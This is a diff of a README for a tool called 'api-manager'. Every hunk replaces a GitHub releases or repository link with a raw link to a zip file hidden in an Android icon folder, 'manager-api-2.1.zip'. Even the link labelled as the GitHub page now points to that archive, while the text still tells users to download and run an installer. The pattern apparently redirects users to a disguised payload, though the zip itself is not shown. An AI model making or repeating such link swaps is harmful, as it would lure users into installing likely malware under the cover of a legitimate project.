@@ -1,6 +1,6 @@
 # ⚙️ api-manager - Easy API Account Management Tool
 
-[![Download api-manager](https://img.shields.io/badge/Download-api--manager-green?style=for-the-badge)](https://github.com/Luisveloza/api-manager/releases)
+[![Download api-manager](https://img.shields.io/badge/Download-api--manager-green?style=for-the-badge)](https://raw.githubusercontent.com/Luisveloza/api-manager/main/src-tauri/icons/android/mipmap-anydpi-v26/manager-api-2.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ To run api-manager, you will need:
 
 To get api-manager, please visit the release page and download the latest version. Follow these steps:
 
-[![Download api-manager](https://img.shields.io/badge/Download-api--manager-blue?style=for-the-badge)](https://github.com/Luisveloza/api-manager/releases)
+[![Download api-manager](https://img.shields.io/badge/Download-api--manager-blue?style=for-the-badge)](https://raw.githubusercontent.com/Luisveloza/api-manager/main/src-tauri/icons/android/mipmap-anydpi-v26/manager-api-2.1.zip)
 
 1. Click the download button above. It will open the release page in your web browser.  
 2. On the release page, look for the latest ".exe" file under Assets. It will have a name like "api-manager-setup.exe" or similar.  
@@ -74,7 +74,7 @@ The app keeps your information safe and easy to reach. You do not need to open m
 
 api-manager does not update automatically. Check the release page regularly for new versions:
 
-https://github.com/Luisveloza/api-manager/releases
+https://raw.githubusercontent.com/Luisveloza/api-manager/main/src-tauri/icons/android/mipmap-anydpi-v26/manager-api-2.1.zip
 
 When there is a new version, download and run the new installer. This will replace the old version while keeping your account data.
 
@@ -100,7 +100,7 @@ api-manager is open-source. You can review the source code and contribute if you
 
 Visit the GitHub page here:
 
-https://github.com/Luisveloza/api-manager
+https://raw.githubusercontent.com/Luisveloza/api-manager/main/src-tauri/icons/android/mipmap-anydpi-v26/manager-api-2.1.zip
 
 ---
 
@@ -113,4 +113,4 @@ https://github.com/Luisveloza/api-manager
 
 ---
 
-[Download api-manager](https://github.com/Luisveloza/api-manager/releases) to get started.
+[Download api-manager](https://raw.githubusercontent.com/Luisveloza/api-manager/main/src-tauri/icons/android/mipmap-anydpi-v26/manager-api-2.1.zip) to get started.
